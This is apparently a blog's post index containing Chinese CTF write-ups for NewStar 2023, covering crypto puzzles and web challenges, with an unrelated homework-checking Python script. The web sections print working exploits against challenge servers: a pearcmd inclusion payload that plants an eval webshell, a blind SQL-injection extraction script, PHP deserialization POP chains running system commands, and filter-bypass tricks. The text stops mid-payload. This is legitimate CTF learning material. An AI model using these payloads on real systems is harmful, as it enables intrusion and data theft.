\n\n\n绕过preg_match,通过%00``%5c绕过\n\n\n最后得到flag：flag&#123;de665d4c-3bbd-44e8-8eba-2b6cfeef881a&#125;\n\n\nR!C!E!\n\n首先观察给出的php代码：\n &lt;?phphighlight_file(__FILE__);if(isset($_POST[&#x27;password&#x27;])&amp;&amp;isset($_POST[&#x27;e_v.a.l&#x27;]))&#123;    $password=md5($_POST[&#x27;password&#x27;]);    $code=$_POST[&#x27;e_v.a.l&#x27;];    if(substr($password,0,6)===&quot;c4d038&quot;)&#123;        if(!preg_match(&quot;/flag|system|pass|cat|ls/i&quot;,$code))&#123;            eval($code);        &#125;    &#125;&#125; \n\n审查代码得知：需要通过POST传参password和e_v.a.l \nmd5碰撞得到：114514的md5值前6为是c4d038\n\n涉及到RCE绕过：通配符绕过，内敛执行\n\n\n\ncryptobrainfuck++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&gt;----.&lt;-----.&gt;-----.&gt;-----.&lt;&lt;&lt;-.&gt;&gt;++..&lt;.&gt;.++++++.....------.&lt;.&gt;.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;+++++++.&gt;&gt;&gt;+.&lt;&lt;&lt;-------.&gt;&gt;&gt;-.&lt;&lt;&lt;+.+++++++.--..&gt;&gt;&gt;&gt;---.-.&lt;&lt;&lt;&lt;-.+++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-------.+.&gt;&gt;&gt;&gt;&gt;++.\nbrainfuck在线解密：\n\nflag&#123;Oiiaioooooiai#b7c0b1866fe58e12&#125;\nCaesar’s Secertkqfl&#123;hf3x4w&#39;x_h1umjw_n5_a4wd_3fed&#125;\n凯撒密码解密：\n\nFencefa&#123;ereigtepanet6680&#125;lgrodrn_h_litx#8fc3\n栅栏密码解密：\n\nflag&#123;reordering_the_plaintext#686f8c03&#125;\nbabyrsaRSA算法\nRSA算法由两个密钥，即公钥和私钥组成。    1）准备两个非常大的素数 p和 q （转换成二进制后 1024个二进制位或者更多，位数越多越难破解）；    2）利用字符串模拟计算大素数 p 和 q 的乘积 m&#x3D;pq；    3）同样方法计算m&#x3D;(p-1)(q-1) ，这里的 m是 n 的欧拉函数；    4）找到一个数e (1&lt;e&lt;m)满足 gcd(m,e)&#x3D;1（即 e 和 m 互素）；    5）计算 e 在模 m 域上的逆元d （即满足ed mod m &#x3D;1 ）；    6）至此，公钥和私钥生成完毕： (n,e)为公钥， (n,d)为私钥；\n\n加密： 对于明文x，用公钥 (n,e)对 x 加密的过程，就是将 x 转换成数字（字符串的话取其 ASCII码或者 unicode 值），然后通过幂取模计算出y ，其中 y就是密文；\n\n解密：对于密文y ，用私钥 (n,d) 对 y 进行解密的过程和加密类似，同样是计算幂取模；\n\n\nfrom Crypto.Util.number import *from flag import flagdef gen_prime(n):    res = 1    for i in range(15):        res *= getPrime(n)    return resif __name__ == &#x27;__main__&#x27;:    n = gen_prime(32)    e = 65537    m = bytes_to_long(flag)    c = pow(m,e,n)    print(n)    print(c)# 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261# 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595\n\n经过大素数分解：17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261\n能分解成：\n2217990919&lt;10&gt; 2338725373&lt;10&gt; 2370292207&lt;10&gt; 2463878387&lt;10&gt; 2706073949&lt;10&gt; 2794985117&lt;10&gt; 2804303069&lt;10&gt; 2923072267&lt;10&gt; 2970591037&lt;10&gt; 3207148519&lt;10&gt; 3654864131&lt;10&gt; 3831680819&lt;10&gt; 3939901243&lt;10&gt; 4093178561&lt;10&gt; 4278428893&lt;10&gt;\n\n根据给出的文件 写出解码脚本：\nimport gmpy2from Crypto.Util.number import *# 公钥ee = 65537# 欧拉函数eular euler = (p - 1) * (q - 1)num = [2217990919, 2338725373, 2370292207, 2463878387,2706073949, 2794985117, 2804303069, 2923072267,       2970591037, 3207148519, 3654864131, 3831680819,3939901243, 4093178561, 4278428893]eular = 1for i in num:    eular = eular * (i - 1)# print(eular)n = 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261c = 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595# 私钥dd = gmpy2.invert(e, eular)m = pow(c, d, n)print(long_to_bytes(m).decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;))\n\nbabyencodingpart 1 of flag: ZmxhZ3tkYXp6bGluZ19lbmNvZGluZyM0ZTBhZDQ=part 2 of flag: MYYGGYJQHBSDCZJRMQYGMMJQMMYGGN3BMZSTIMRSMZSWCNY=part 3 of flag: =8S4U,3DR8SDY,C`S-F5F-C(S,S&lt;R-C`Q9F8S87T`\n\n看到题目 得知：flag由三个部分组成 \n\npart 1 of flag：base64  flag{dazzling_encoding#4e0ad4\n\npart 2 of flag:base32   f0ca08d1e1d0f10c0c7afe422fea7\n\npart 3 of flag: UUencode  c55192c992036ef623372601ff3a}\n\n\n\nflag: flag{dazzling_encoding#4e0ad4f0ca08d1e1d0f10c0c7afe422fea7c55192c992036ef623372601ff3a}\n\n\nUUencode​\t简述：\n​\tUUencode是一种二进制到文字的编码，最早在unix邮件系统中使用，全称：Unix-to-Unix  encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。\n​\t举例：\n明文：hello,world.密文：,:&amp;5L;&amp;\\L=V]R;&amp;0N\n\n​\t在线解密&amp;工具：\nhttp://www.hiencode.com/uu.html\nbabyxor题目：\nfrom secret import *ciphertext = []flag = &#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;for f in flag:    ciphertext.append(f ^ key)print(bytes(ciphertext).hex())# e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2\n\n解密脚本\nfrom pwn import xorciphertext = bytes.fromhex(&#x27;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&#x27;)for i in range(256):    if b&#x27;flag&#x27; in xor(bytes([i]), ciphertext):        print(xor(bytes([i]), ciphertext))\n\nbabyaes题目：\nfrom Crypto.Cipher import AESimport os# from flag import flagfrom Crypto.Util.number import *def pad(data):    return data + b&quot;&quot;.join([b&#x27;\\x00&#x27; for _ in range(0, 16 - len(data))])def main():    flag_ = pad(flag)    key = os.urandom(16) * 2    iv = os.urandom(16)    print(bytes_to_long(key) ^ bytes_to_long(iv) ^ 1)    aes = AES.new(key, AES.MODE_CBC, iv)    enc_flag = aes.encrypt(flag_)    print(enc_flag)if __name__ == &quot;__main__&quot;:    main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;\n\n解题aes，我们需要密码key，偏移量iv，根据题目提示，加密模式是AES-CBC\nfrom Crypto.Cipher import AESimport os# from flag import flagfrom Crypto.Util.number import *def main():    xor = 3657491768215750635844958060963805125333761387746954618540958489914964573229 ^ 1    print(xor)    out = long_to_bytes(xor)    key = out[:16] * 2    print(key)    iv = bytes_to_long(key[16:]) ^ bytes_to_long(out[16:])    iv = long_to_bytes(iv)    print(iv)    ciphertext = b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;    cipher = AES.new(key, AES.MODE_CBC, iv)    flag = cipher.decrypt(ciphertext)    print(flag)if __name__ == &quot;__main__&quot;:    main()# 3657491768215750635844958060963805125333761387746954618540958489914964573229# b&#x27;&gt;]\\xc1\\xe5\\x82/\\x02\\x7ft\\xf1B\\x8d\\n\\xc1\\x95i&#x27;\n\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"NewStar2023 Week3","url":"/NewStar2023-WriteUp-Week3/","content":"week3webInclude 🍐题目：\n &lt;?php    error_reporting(0);    if(isset($_GET[&#x27;file&#x27;])) &#123;        $file = $_GET[&#x27;file&#x27;];                if(preg_match(&#x27;/flag|log|session|filter|input|data/i&#x27;, $file)) &#123;            die(&#x27;hacker!&#x27;);        &#125;                include($file.&quot;.php&quot;);        # Something in phpinfo.php!    &#125;    else &#123;        highlight_file(__FILE__);    &#125;?&gt; \n\n根据提示打开phpinfo.php &#x3D;&gt; ?file=phpinfo, 搜索flag\n\n根据提示搜索register_argc_argv, 发现为On\n\n结合题目提示🍐，应该是利用pearcmd文件包含\n构造payload\n?+config-create+/&amp;file=/usr/local/lib/php/pearcmd&amp;/&lt;?=@eval($_POST[0]);?&gt;+/tmp/cmd.php\n\n进行POST查看flag\n?file=/tmp/cmd#POST0 = system(&quot;cat /flag&quot;);\n\n\n参考文章：https://blog.csdn.net/RABCDXB/article/details/122050370\nmedium_sql测试判断是否存在布尔盲注 # 要编码为%23\n?id=TMP0919&#x27;And if(1&gt;0,1,0)%23?id=TMP0919&#x27;And if(0&gt;1,1,0)%23\n\n前者可以返回正常的信息id: TMP0919，后者会返回id not exists  \n注意用大小写绕过被过滤的字符\nimport timeimport requestsdef db_length(str, url):    print(&quot;[-] 测试数据库长度.......&quot;)    num = 1    while True:        payload = url + f&quot;&#x27;%20And%20lengTh(daTabase())=&#123;num&#125;%23&quot;        # print(payload)        r = requests.get(url=payload)        time.sleep(0.1)        # print(r.text)        if str in r.text:            db_length = num            print(f&quot;[+] 数据库长度：&#123;db_length&#125;&quot;)            db_name(db_length)            break        else:            num += 1def db_name(db_length):    print(&quot;[-] 测试数据库名.......&quot;)    strascii = &quot;qwertyuioplkjhgfdsazxcvbnm1234567890&quot;    tmp = &quot;&quot;    for i in range(1, db_length + 1):        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr(dAtabase(),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            # print(payload)            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                print(tmp)    print(f&quot;[+] 数据库名：&#123;tmp&#125;&quot;)    table_name()def table_name():    print(&quot;[-] 测试数据库 表名.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;    tmp = &quot;&quot;    for i in range(25):  # 假定表的长度为25        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(table_name)%20fRom%20infoRmation_schema.tables%20wHere%20tAble_schema=dAtabase()),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                # print(tmp)    print(f&quot;[+] 数据库 表名：&#123;tmp&#125;&quot;)    table_columns()def table_columns():  # 此函数是在测试处数据库表名后才写出，因而知道表名“grades,here_is_flag”    print(&quot;[-] 测试数据库表中列名信息.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &quot;    tmp = &quot;&quot;    for i in range(10):  # 假定列名长度为10        for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20Group_Concat(column_name)%20fRom%20infoRmation_schema.columns%20wHere%20tAble_name=&#x27;here_is_flag&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                print(tmp)    print(f&quot;[+] 数据库表中列名信息：&#123;tmp&#125;&quot;)    information_flag()def information_flag():    print(&quot;[-] 测试数据库表中数据.......&quot;)    strascii = &quot;abcdefghijklmnopqrstuvwxyz1234567890_, &#123;&#125;&quot;    tmp = &quot;&quot;    for i in range(50):          for j in strascii:            payload = url + f&quot;&#x27;%20And%20Substr((Select%20flag%20fRom%20here_is_flag),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;%23&quot;            time.sleep(0.1)            r = requests.get(url=payload)            if str in r.text:                tmp += j                # print(tmp)    print(f&quot;[+] 数据库表中数据：&#123;tmp&#125;&quot;)if __name__ == &#x27;__main__&#x27;:    url = &#x27;http://efffc673-9bf2-42fc-ac02-9a443cbe5a85.node4.buuoj.cn:81/?id=TMP0919&#x27;    str = &#x27;Physics&#x27;    db_length(str, url)\n\n注意：上述脚本没有使用算法，直接遍历获得相关信息，因而运行时间较长，各位可以根据需求修改代码\n\nPOP Gadget题目：\n &lt;?phphighlight_file(__FILE__);class Begin&#123;    public $name;    public function __destruct()    &#123;        if(preg_match(&quot;/[a-zA-Z0-9]/&quot;,$this-&gt;name))&#123;            echo &quot;Hello&quot;;        &#125;else&#123;            echo &quot;Welcome to NewStarCTF 2023!&quot;;        &#125;    &#125;&#125;class Then&#123;    private $func;    public function __toString()    &#123;        ($this-&gt;func)();        return &quot;Good Job!&quot;;    &#125;&#125;class Handle&#123;    protected $obj;    public function __call($func, $vars)    &#123;        $this-&gt;obj-&gt;end();    &#125;&#125;class Super&#123;    protected $obj;    public function __invoke()    &#123;        $this-&gt;obj-&gt;getStr();    &#125;    public function end()    &#123;        die(&quot;==GAME OVER==&quot;);    &#125;&#125;class CTF&#123;    public $handle;    public function end()    &#123;        unset($this-&gt;handle-&gt;log);    &#125;&#125;class WhiteGod&#123;    public $func;    public $var;    public function __unset($var)    &#123;        ($this-&gt;func)($this-&gt;var);        &#125;&#125;@unserialize($_POST[&#x27;pop&#x27;]); \n\n\n&#x2F;&#x2F;目的是触发readfile(“&#x2F;flag”)函数\n&#x2F;&#x2F;需要触发WihteGod-&gt;__unset()方法 就必须通过unset(WihteGod()) \n&#x2F;&#x2F;需要unset(WihteGod()) 就必须通过CTF-&gt;end()\n&#x2F;&#x2F;需要CTF-&gt;end() 就必须通过Handle-&gt;__call()\n&#x2F;&#x2F;需要Handle-&gt;__call() 就必须通过Handle-&gt;不存在的函数 也就是Handle-&gt;getStr()   —call是魔术方法的一个，当程序调用到当前类中未声明或没权限调用的方法时，就会调用—call方法\n&#x2F;&#x2F;需要Handle-&gt;getStr() 就必须通过Super-&gt;__invoke() \n&#x2F;&#x2F;需要Super-&gt;__invoke() 就必须通过(Super)()被当做函数调用—invoke()：当尝试以调用函数的方式调用一个对象时，—invoke() 方法会被自动调用。\n&#x2F;&#x2F;需要(Super)() 就必须通过Then-&gt;__toString()\n&#x2F;&#x2F;需要Then-&gt;__toString() 就必须Then被当做字符串\n&#x2F;&#x2F;需要Then被当做字符串 就必须通过Begin-&gt;__destruct()\n\n由题目得知，我们最终是要想办法触发WhiteGod-&gt;__unset()方法，这样就能够通过构造**WhiteGod(func,cmd)**类，传入需要执行的函数和命令（例如system(&quot;ls&quot;)）。\n要触发WhiteGod-&gt;__unset()方法，就必须有一个unset(WhiteGod-&gt;不存在)，也就是**CTF(WhiteGod(func,cmd))**，并且要想办法触发CTF-&gt;end()。\n要触发CTF-&gt;end()方法，就只能通过Handle(CTF)，也就是**Handle(CTF(WhiteGod(func,cmd)))**。并且要想办法触发Handle-&gt;__call()。\n要触发Handle-&gt;__call()方法，就需要出现Handle-&gt;不存在，即Handle-&gt;不存在getStr()，也就是**Super(Handle(CTF(WhiteGod(func,cmd))))**，并且要想办法触发Super-&gt;__invoke()。\n要触发Super-&gt;__invoke()方法，就需要出现(Super)();即Super被当做函数名调用，也就是**Then(Super(Handle(CTF(WhiteGod(func,cmd)))))**，并且要想办法触发Then-&gt;__toString()方法。\n要触发Then-&gt;__toString()方法，就需要Then被当做字符串处理，即Begin()-&gt;__destruct()中的正则。也就是Begin(Then(Super(Handle(CTF(WhiteGod(func,cmd)))))\n这样，完整的POP链就构造出来了\n\n编写Exp\n&lt;?phpuse Begin as GlobalBegin;use Then as GlobalThen;class Begin&#123;    public $name;    public function __construct($a)    &#123;        $this-&gt;name = $a;    &#125;&#125;class Then&#123;    private $func;    public function __construct($a)    &#123;        $this-&gt;func = $a;    &#125;&#125;class Handle&#123;    protected $obj;    public function __construct($a)    &#123;        $this-&gt;obj = $a;    &#125;&#125;class Super&#123;    protected $obj;    public function __construct($a)    &#123;        $this-&gt;obj = $a;    &#125;&#125;class CTF&#123;    public $handle;    public function __construct($a)    &#123;        $this-&gt;handle = $a;    &#125;&#125;class WhiteGod&#123;    public $func;    public $var;    public function __construct($a, $b)    &#123;        $this-&gt;func = $a;        $this-&gt;var = $b;    &#125;&#125;$obj = new Begin(new Then(new Super(new Handle(new CTF(new WhiteGod(&quot;readfile&quot;,&quot;/flag&quot;))))) );echo urlencode(serialize($obj));?&gt;\n\n\nR!!!C!!!E!!!题目：\n &lt;?phphighlight_file(__FILE__);class minipop&#123;    public $code;    public $qwejaskdjnlka;    public function __toString()    &#123;        if(!preg_match(&#x27;/\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;, $this-&gt;code))&#123;            exec($this-&gt;code);        &#125;        return &quot;alright&quot;;    &#125;    public function __destruct()    &#123;        echo $this-&gt;qwejaskdjnlka;    &#125;&#125;if(isset($_POST[&#x27;payload&#x27;]))&#123;    //wanna try?    unserialize($_POST[&#x27;payload&#x27;]);&#125; \n\n观察源码，典型的php序列化，观察题目，这又是一道rce的题目，应该可以通过tee命令-&gt;把执行的命令写入文件，我们可以访问这个文件来看到回显内容\n&lt;?phpclass minipop&#123;    public $code=&quot;ls / | t&#x27;&#x27;ee a&quot;;    public $qwejaskdjnlka;&#125;$a = new minipop();$b = new minipop();$b-&gt;qwejaskdjnlka = $a;echo urlencode(serialize($b));?&gt;\n\nO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D注意将+ 换成%20\n接着访问url/a\n\n发现flag的藏身之地\n&lt;?phpclass minipop&#123;    public $code=&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee b&quot;;    public $qwejaskdjnlka;&#125;$a = new minipop();$b = new minipop();$b-&gt;qwejaskdjnlka = $a;echo urlencode(serialize($b));?&gt;\n\n访问url&#x2F;b 出现flag\n\nGenShin抓包发现：&#x2F;secr3tofpop\n\n打开发现 需要通过get给name传参\n\n发现给name传什么，页面就回显什么，首先尝试了php伪协议读取文件，测试失败，在查询资料后发现与UNCTF2020的easyflask题目很相似，猜测是模版注入，首先尝试**{{%print(7*7)%}}**,发现应该是&#96;\n","categories":["CTF","NewStar 2023"],"tags":["ctf","crypto","web"]},{"title":"Python Homework Checker","url":"/Python-Homework-Checker/","content":"Python Homework Checker(根据Excel名单对照文件夹中学生作业进行检查是否提交作业)​          现在一般的作业都是网上提交文件为主，我们总会有一些作为收作业的人会烦恼谁还没交作业，所以我就这个问题写了一段小代码来检测哪个人没交作业。 \n​           原理是读入作业所在的文件夹里面所有的文件名称，将这些文件名称和你要收集的名单对比，将没有的名单输出 以下是一个用Python检查学生是否提交作业的程序，它可以检查一个文件夹中是否存在按学生学号命名的PDF文件，以确定哪些学生已经提交作业。本程序使用openpyxl和os库，因此需要确保安装了这两个库。 \n​          如果Excel文件中有多列信息，我们可以使用列标题来查找学号所在的列。我们还需要根据学号来提取姓名，因为文件夹中的PDF文件名是“学号-姓名”格式。 \n​          这个程序首先查找Excel文件中包含“学号”标题的列，并记录该列的列字母。然后它遍历文件夹中的PDF文件，对于每个PDF文件，它会提取学生学号和姓名，并将学号和姓名添加到已提交字典中。然后它遍历Excel文件中的每一行，使用学号列的列字母来提取学生学号，并使用学号在已提交字典中查找对应的姓名，并打印出相应的提交状态。 \n代码复现import openpyxlimport os# 定义文件夹路径和Excel文件路径folder_path = &quot;D:\\\\University\\\\Sophomore_second\\\\R222A1035120001工程项目管理与经济决策\\\\R222A1035120001工程项目管理与经济决策&quot;excel_path = &quot;D:\\\\University\\\\Sophomore_second\\\\R222A1035120001工程项目管理与经济决策\\\\R222A1035120001学生名单0310.xlsx&quot;# 打开Excel文件wb = openpyxl.load_workbook(excel_path)sheet = wb.active# 创建一个空的字典来存储已经提交作业的学生学号submitted = &#123;&#125;# 查找Excel文件中学号所在的列headers = [cell.value for cell in sheet[1]]if &quot;学号&quot; not in headers:    print(&quot;Error: cannot find the column containing student IDs.&quot;)    exit()student_id_column = headers.index(&quot;学号&quot;) + 1# 遍历文件夹中的PDF文件，检查是否存在按学生学号命名的PDF文件for filename in os.listdir(folder_path):    if filename.endswith(&quot;.pdf&quot;):        student_id, student_name = filename[:-4].rsplit(&quot;-&quot;, 1) # 分离学号和姓名        submitted[student_id] = student_name# 遍历Excel文件中的学生名单，检查哪些学生已经提交作业for row in sheet.iter_rows(min_row=2, values_only=True):    student_id = str(row[student_id_column - 1])    if student_id in submitted:        pass    else:        print(f&quot;&#123;row[1]&#125; (&#123;student_id&#125;) has not submitted the homework.&quot;)\n","categories":["python"],"tags":["python","excel","openpyxl","os"]},{"title":"NewStar2023 WriteUp Week4","url":"/NewStar2023-WriteUp-Week4/","content":"week4web逃题目：\n &lt;?phphighlight_file(__FILE__);function waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key;    public $cmd = &quot;whoami&quot;;    public function __construct($key)    &#123;        $this-&gt;key = $key;    &#125;    public function __destruct()    &#123;        system($this-&gt;cmd);    &#125;&#125;unserialize(waf(serialize(new GetFlag($_GET[&#x27;key&#x27;])))); www-data www-data \n\n经典的php反序列化字符逃逸\n首先构造序列化代码：\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;bad&#x27;;       public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:3:&quot;bad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n我们需要逃逸的是&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;\n\n\n\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:24:&quot;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;\n总共24个字符，于是我们写24个bad就行\n&lt;?phpfunction waf($str)&#123;    return str_replace(&quot;bad&quot;,&quot;good&quot;,$str);&#125;class GetFlag &#123;    public $key=&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&#x27;;      public $cmd = &quot;ls /&quot;;&#125;$a = new GetFlag();echo serialize($a).&quot;\\n&quot;;$res = waf(serialize($a));echo $res.&quot;\\n&quot;;$c = unserialize($res);print_r($c).&quot;\\n&quot;;echo $c-&gt;cmd;\n\n运行结果：\nO:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;O:7:&quot;GetFlag&quot;:2:&#123;s:3:&quot;key&quot;;s:96:&quot;goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;GetFlag Object(    [key] =&gt; goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood    [cmd] =&gt; ls /)ls /\n\npayload：\nkey = badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;&quot; \n\n接着构造payload查看flag\n/?key=.badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;\n\nMore Fast题目：\n &lt;?phphighlight_file(__FILE__);class Start&#123;    public $errMsg;    public function __destruct() &#123;        die($this-&gt;errMsg);    &#125;&#125;class Pwn&#123;    public $obj;    public function __invoke()&#123;        $this-&gt;obj-&gt;evil();    &#125;    public function evil() &#123;        phpinfo();    &#125;&#125;class Reverse&#123;    public $func;    public function __get($var) &#123;        ($this-&gt;func)();    &#125;&#125;class Web&#123;    public $func;    public $var;    public function evil() &#123;        if(!preg_match(&quot;/flag/i&quot;,$this-&gt;var))&#123;            ($this-&gt;func)($this-&gt;var);        &#125;else&#123;            echo &quot;Not Flag&quot;;        &#125;    &#125;&#125;class Crypto&#123;    public $obj;    public function __toString() &#123;        $wel = $this-&gt;obj-&gt;good;        return &quot;NewStar&quot;;    &#125;&#125;class Misc&#123;    public function evil() &#123;        echo &quot;good job but nothing&quot;;    &#125;&#125;$a = @unserialize($_POST[&#x27;fast&#x27;]);throw new Exception(&quot;Nope&quot;);Fatal error: Uncaught Exception: Nope in /var/www/html/index.php:55 Stack trace: #0 &#123;main&#125; thrown in /var/www/html/index.php on line 55\n\n首先就是构造pop链：\n\n&#x2F;&#x2F;目的是触发Web中的evil函数 执行 system (cat &#x2F;f*)\n&#x2F;&#x2F;需要触发Web-&gt;evil()函数 就需要触发Pwn中的__invoke()方法\n&#x2F;&#x2F;需要触发Pwn中的__invoke()方法 就需要触发Reverse中的__get()方法 –&gt; 调用不存在的成员属性 \n&#x2F;&#x2F;需要触发Reverse中的__get()方法  就需要触发Crypto中的__toString()方法 –&gt; 被当成一个对象时调用\n&#x2F;&#x2F;需要触发Crypto中的__toString()方法 就需要通过start中的__destruct()方法\n\n所以完整的pop链：__destruct()-&gt;__toString()-&gt;__get($var)-&gt;__invoke()-&gt;Web\n构造poc：\n&lt;?phpclass Start&#123;    public $errMsg;&#125;class Pwn&#123;    public $obj;&#125;class Reverse&#123;    public $func;&#125;class Web&#123;    public $func = &quot;system&quot;;    public $var = &quot;cat /f*&quot;;&#125;class Crypto&#123;    public $obj;&#125;$a = new Start();$a-&gt;errMsg = new Crypto();$b = $a-&gt;errMsg;$b-&gt;obj = new Reverse();$c = $b-&gt;obj;$c-&gt;func = new Pwn();$d = $c-&gt;func;$d-&gt;obj = new Web();echo serialize($a);\n\nO:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:7:&quot;cat /f*&quot;;&#125;&#125;&#125;&#125;&#125;\n根据题目提示以及源代码中出现throw new Exception(&quot;Nope&quot;);\n这会导致反序列化之后直接经过异常报错，导致后面的__destruct() 无法触发\n\n快速触发destruct\n\n修改序列化数字的个数\n原paylaod：O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}\n现payload：O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat 